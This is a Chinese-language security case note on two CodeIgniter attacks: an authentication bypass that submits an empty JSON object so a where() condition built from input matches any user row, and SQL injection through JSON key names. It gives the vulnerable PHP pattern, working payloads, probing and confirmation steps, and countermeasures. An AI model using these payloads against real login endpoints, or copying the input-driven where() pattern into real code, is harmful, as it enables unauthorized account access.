---
title: "CodeIgniter 空 where 认证绕过 + JSON 键名 SQLi"
type: case-lesson
tags: [web-injection, codeigniter, auth-bypass, sqli, php]
date_created: 2026-10-06
sources: ["https://x.com/Zerodaylabowner"]
---

# CodeIgniter 空 where 认证绕过 + JSON 键名注入

> 来源：@Zerodaylabowner（2026-10-04）—— 两种 CI 特化打法，同一引擎（Query Builder 条件从输入直变）。

## 1. 空 where 认证绕过

场景：登录/校验逻辑把请求 JSON 直接变成查询条件（CI Query Builder）：

```php
// 等价形态：条件数组来自输入
$where = json_decode($input, true);          // 攻击者提交 {}
$row = $this->db->where($where)->get('users')->row();
if ($row) { /* 视为登录成功 */ }
```

- 提交 `{}`（空对象）→ 条件为空 → 查询退化为"取任意一行"（`SELECT * FROM users LIMIT 1`）。
- 表里有任何一行 → `row()` 非空 → **认证判断直接通过**。
- 变体：`[]`、嵌套空数组等，视框架版本/写法。

## 2. JSON 键名 SQLi

```json
{"login\" or 1=1 -- -": "user"}
```

- 键名未参数化地被拼进 where 片段/字符串 → 键里的 `"` 闭合 + `or 1=1` 成立。
- 探型：改动键名看 500/200 差异；再上 `-- -`、`#`、`/**/` 注释变体。

## 判定

```
POST 登录接口 JSON {} → 200 + 会话/令牌      = 空 where 绕过 confirmed
键名注入: {"a\" or 1=1-- -":"x"} → 行为差异   = 键名拼接 confirmed
```

## 反制

- 输入**结构白名单**：只允许固定键集（login/password/...），拒绝任意键与操作符。
- CI：`where()` 不吃用户数组；条件字段/操作符枚举映射；键值全部参数化，查询构件禁止字符串拼接。

## 关联

- `sqli-minimal-probe-to-ato.md`（同源账号：最小探型 → ATO 打法）
